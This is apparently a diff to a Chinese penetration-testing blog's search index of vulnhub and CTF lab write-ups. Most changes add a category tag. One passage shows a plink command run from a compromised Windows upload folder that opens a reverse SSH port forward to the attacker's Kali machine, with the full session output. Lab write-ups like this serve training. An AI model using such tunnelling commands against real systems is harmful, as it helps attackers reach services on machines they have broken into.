@@ -105,6 +105,7 @@
 ]]></content>
       <categories>
         <category>vulnhub</category>
+        <category>DC</category>
       </categories>
       <tags>
         <tag>靶机</tag>
@@ -235,6 +236,7 @@
 ]]></content>
       <categories>
         <category>vulnhub</category>
+        <category>DC</category>
       </categories>
       <tags>
         <tag>靶机</tag>
@@ -541,6 +543,7 @@
 ]]></content>
       <categories>
         <category>vulnhub</category>
+        <category>DC</category>
       </categories>
       <tags>
         <tag>靶机</tag>
@@ -632,6 +635,7 @@
 ]]></content>
       <categories>
         <category>vulnhub</category>
+        <category>DC</category>
       </categories>
       <tags>
         <tag>靶机</tag>
@@ -754,6 +758,7 @@
 ]]></content>
       <categories>
         <category>vulnhub</category>
+        <category>DC</category>
       </categories>
       <tags>
         <tag>靶机</tag>
@@ -944,7 +949,7 @@
 <blockquote>
 <p>报错为：无法同意密钥交换算法</p>
 <p>Google一下发现需要更新putty，但是更新后还是不好使。。。菜狗一脸茫然！</p>
-<p>C:\xampp\htdocs\gym\upload&gt;plink.exe -v -x -a -T -C -noagent -ssh -pw “root” -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjMTE0OyYjMTExOyYjMTExOyYjMTE2OyYjeDQwOyYjeDMxOyYjeDMwOyYjeDJlOyYjeDMxOyYjeDMwOyYjeDJlOyYjeDMxOyYjeDM3OyYjNDY7JiM1MDsmI3gzMTsmIzU0Ow==">&#114;&#111;&#111;&#116;&#x40;&#x31;&#x30;&#x2e;&#x31;&#x30;&#x2e;&#x31;&#x37;&#46;&#50;&#x31;&#54;<i class="fa fa-external-link-alt"></i></span><br>plink.exe -v -x -a -T -C -noagent -ssh -pw “root” -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjMTE0OyYjMTExOyYjMTExOyYjeDc0OyYjNjQ7JiM0OTsmIzQ4OyYjNDY7JiN4MzE7JiN4MzA7JiM0NjsmIzQ5OyYjeDM3OyYjNDY7JiN4MzI7JiN4MzE7JiM1NDs=">&#114;&#111;&#111;&#x74;&#64;&#49;&#48;&#46;&#x31;&#x30;&#46;&#49;&#x37;&#46;&#x32;&#x31;&#54;<i class="fa fa-external-link-alt"></i></span><br>Looking up host “10.10.17.216”<br>Connecting to 10.10.17.216 port 22<br>Server version: SSH-2.0-OpenSSH_8.3p1 Debian-1<br>Using SSH protocol version 2<br>We claim version: SSH-2.0-PuTTY_Release_0.63<br>Couldn’t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjeDYzOyYjMTE3OyYjeDcyOyYjMTE4OyYjMTAxOyYjeDMyOyYjeDM1OyYjNTM7JiM0OTsmI3gzOTsmIzQ1OyYjeDczOyYjeDY4OyYjOTc7JiN4MzI7JiM1MzsmI3gzNjsmI3g0MDsmI3g2YzsmIzEwNTsmI3g2MjsmIzExNTsmIzExNTsmI3g2ODsmIzQ2OyYjMTExOyYjeDcyOyYjMTAzOw==">&#x63;&#117;&#x72;&#118;&#101;&#x32;&#x35;&#53;&#49;&#x39;&#45;&#x73;&#x68;&#97;&#x32;&#53;&#x36;&#x40;&#x6c;&#105;&#x62;&#115;&#115;&#x68;&#46;&#111;&#x72;&#103;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)<br>FATAL ERROR: Couldn’t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjOTk7JiN4NzU7JiN4NzI7JiMxMTg7JiN4NjU7JiM1MDsmI3gzNTsmIzUzOyYjeDMxOyYjeDM5OyYjNDU7JiN4NzM7JiMxMDQ7JiN4NjE7JiN4MzI7JiN4MzU7JiN4MzY7JiN4NDA7JiN4NmM7JiMxMDU7JiM5ODsmIzExNTsmIzExNTsmIzEwNDsmIzQ2OyYjeDZmOyYjeDcyOyYjeDY3Ow==">&#99;&#x75;&#x72;&#118;&#x65;&#50;&#x35;&#53;&#x31;&#x39;&#45;&#x73;&#104;&#x61;&#x32;&#x35;&#x36;&#x40;&#x6c;&#105;&#98;&#115;&#115;&#104;&#46;&#x6f;&#x72;&#x67;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)</p>
+<p>C:\xampp\htdocs\gym\upload&gt;plink.exe -v -x -a -T -C -noagent -ssh -pw “root” -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjeDcyOyYjeDZmOyYjeDZmOyYjMTE2OyYjNjQ7JiN4MzE7JiN4MzA7JiN4MmU7JiM0OTsmI3gzMDsmIzQ2OyYjNDk7JiN4Mzc7JiM0NjsmIzUwOyYjeDMxOyYjNTQ7">&#x72;&#x6f;&#x6f;&#116;&#64;&#x31;&#x30;&#x2e;&#49;&#x30;&#46;&#49;&#x37;&#46;&#50;&#x31;&#54;<i class="fa fa-external-link-alt"></i></span><br>plink.exe -v -x -a -T -C -noagent -ssh -pw “root” -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjeDcyOyYjeDZmOyYjeDZmOyYjeDc0OyYjeDQwOyYjNDk7JiN4MzA7JiM0NjsmI3gzMTsmI3gzMDsmIzQ2OyYjeDMxOyYjeDM3OyYjNDY7JiN4MzI7JiN4MzE7JiN4MzY7">&#x72;&#x6f;&#x6f;&#x74;&#x40;&#49;&#x30;&#46;&#x31;&#x30;&#46;&#x31;&#x37;&#46;&#x32;&#x31;&#x36;<i class="fa fa-external-link-alt"></i></span><br>Looking up host “10.10.17.216”<br>Connecting to 10.10.17.216 port 22<br>Server version: SSH-2.0-OpenSSH_8.3p1 Debian-1<br>Using SSH protocol version 2<br>We claim version: SSH-2.0-PuTTY_Release_0.63<br>Couldn’t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjeDYzOyYjMTE3OyYjeDcyOyYjeDc2OyYjMTAxOyYjNTA7JiM1MzsmI3gzNTsmI3gzMTsmIzU3OyYjNDU7JiMxMTU7JiMxMDQ7JiM5NzsmI3gzMjsmIzUzOyYjeDM2OyYjeDQwOyYjeDZjOyYjeDY5OyYjOTg7JiN4NzM7JiN4NzM7JiN4Njg7JiM0NjsmIzExMTsmIzExNDsmI3g2Nzs=">&#x63;&#117;&#x72;&#x76;&#101;&#50;&#53;&#x35;&#x31;&#57;&#45;&#115;&#104;&#97;&#x32;&#53;&#x36;&#x40;&#x6c;&#x69;&#98;&#x73;&#x73;&#x68;&#46;&#111;&#114;&#x67;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)<br>FATAL ERROR: Couldn’t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjeDYzOyYjMTE3OyYjMTE0OyYjMTE4OyYjeDY1OyYjeDMyOyYjeDM1OyYjNTM7JiM0OTsmI3gzOTsmIzQ1OyYjeDczOyYjMTA0OyYjeDYxOyYjNTA7JiN4MzU7JiM1NDsmIzY0OyYjMTA4OyYjMTA1OyYjeDYyOyYjMTE1OyYjMTE1OyYjMTA0OyYjNDY7JiMxMTE7JiMxMTQ7JiMxMDM7">&#x63;&#117;&#114;&#118;&#x65;&#x32;&#x35;&#53;&#49;&#x39;&#45;&#x73;&#104;&#x61;&#50;&#x35;&#54;&#64;&#108;&#105;&#x62;&#115;&#115;&#104;&#46;&#111;&#114;&#103;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)</p>
 </blockquote>
 <p><code>第二天我又来了，这回成功了！，这回换成了powershell。</code></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\xampp\htdocs\gym\upload&gt; .\plink.exe -v -x -a -T -C -noagent -ssh -pw <span class="string">&quot;root&quot;</span> -R 8888:127.0.0.1:8888 root@10.10.17.216</span><br><span class="line">.\plink.exe -v -x -a -T -C -noagent -ssh -pw <span class="string">&quot;root&quot;</span> -R 8888:127.0.0.1:8888 root@10.10.17.216</span><br><span class="line">Looking up host <span class="string">&quot;10.10.17.216&quot;</span> <span class="keyword">for</span> SSH connection</span><br><span class="line">Connecting to 10.10.17.216 port 22</span><br><span class="line">We claim version: SSH-2.0-PuTTY_Release_0.74</span><br><span class="line">Remote version: SSH-2.0-OpenSSH_8.3p1 Debian-1</span><br><span class="line">Using SSH protocol version 2</span><br><span class="line">Doing ECDH key exchange with curve Curve25519 and <span class="built_in">hash</span> SHA-256 (SHA-NI accelerated)</span><br><span class="line">Server also has ecdsa-sha2-nistp256/ssh-rsa host keys, but we don<span class="string">&#x27;t know any of them</span></span><br><span class="line"><span class="string">Host key fingerprint is:</span></span><br><span class="line"><span class="string">ssh-ed25519 255 83:5a:22:c2:54:d1:3b:98:fa:09:81:52:f2:3b:75:8e</span></span><br><span class="line"><span class="string">The server&#x27;</span>s host key is not cached <span class="keyword">in</span> the registry. You</span><br><span class="line">have no guarantee that the server is the computer you</span><br><span class="line">think it is.</span><br><span class="line">The server<span class="string">&#x27;s ssh-ed25519 key fingerprint is:</span></span><br><span class="line"><span class="string">ssh-ed25519 255 83:5a:22:c2:54:d1:3b:98:fa:09:81:52:f2:3b:75:8e</span></span><br><span class="line"><span class="string">If you trust this host, enter &quot;y&quot; to add the key to</span></span><br><span class="line"><span class="string">PuTTY&#x27;</span>s cache and carry on connecting.</span><br><span class="line">If you want to carry on connecting just once, without</span><br><span class="line">adding the key to the cache, enter <span class="string">&quot;n&quot;</span>.</span><br><span class="line">If you <span class="keyword">do</span> not trust this host, press Return to abandon the</span><br><span class="line">connection.</span><br><span class="line">Store key <span class="keyword">in</span> cache? (y/n) y</span><br><span class="line">Initialised AES-256 SDCTR (AES-NI accelerated) outbound encryption</span><br><span class="line">Initialised HMAC-SHA-256 (SHA-NI accelerated) outbound MAC algorithm</span><br><span class="line">Will <span class="built_in">enable</span> zlib (RFC1950) compression after user authentication</span><br><span class="line">Initialised AES-256 SDCTR (AES-NI accelerated) inbound encryption</span><br><span class="line">Initialised HMAC-SHA-256 (SHA-NI accelerated) inbound MAC algorithm</span><br><span class="line">Will <span class="built_in">enable</span> zlib (RFC1950) decompression after user authentication</span><br><span class="line">Using username <span class="string">&quot;root&quot;</span>.</span><br><span class="line">Sent password</span><br><span class="line">Initialised delayed zlib (RFC1950) decompression</span><br><span class="line">Initialised delayed zlib (RFC1950) compression</span><br><span class="line">Access granted</span><br><span class="line">Requesting remote port 8888 forward to 127.0.0.1:8888</span><br><span class="line">Opening main session channel</span><br><span class="line">Remote port forwarding from 8888 enabled</span><br><span class="line">Opened main channel</span><br><span class="line">Started a shell/<span class="built_in">command</span></span><br><span class="line">Linux JIYE 5.7.0-kali1-amd64 <span class="comment">#1 SMP Debian 5.7.6-1kali2 (2020-07-01) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Kali GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">ls</span><br><span class="line">arachni</span><br><span class="line">cacert.der</span><br><span class="line">clash</span><br><span class="line">CS4.0</span><br><span class="line">Desktop</span><br><span class="line">Documents</span><br><span class="line">Downloads</span><br><span class="line">get-pip.py</span><br><span class="line">htb</span><br><span class="line">Lluna.ovpn</span><br><span class="line">Lluna.ovpn.bak</span><br><span class="line">Music</span><br><span class="line">Pictures</span><br><span class="line">Public</span><br><span class="line">python_shell</span><br><span class="line">Templates</span><br><span class="line">Videos</span><br><span class="line">vulnhub</span><br></pre></td></tr></table></figure>
@@ -1572,6 +1577,7 @@
 <h2 id="0x11-接下来就是擦屁股走人了，干不动了。。。"><a href="#0x11-接下来就是擦屁股走人了，干不动了。。。" class="headerlink" title="0x11.接下来就是擦屁股走人了，干不动了。。。"></a>0x11.接下来就是擦屁股走人了，干不动了。。。</h2>]]></content>
       <categories>
         <category>vulnhub</category>
+        <category>DC</category>
       </categories>
       <tags>
         <tag>靶机</tag>
@@ -1701,6 +1707,7 @@
 ]]></content>
       <categories>
         <category>vulnhub</category>
+        <category>DC</category>
       </categories>
       <tags>
         <tag>靶机</tag>
@@ -1812,6 +1819,7 @@
 ]]></content>
       <categories>
         <category>vulnhub</category>
+        <category>DC</category>
       </categories>
       <tags>
         <tag>靶机</tag>
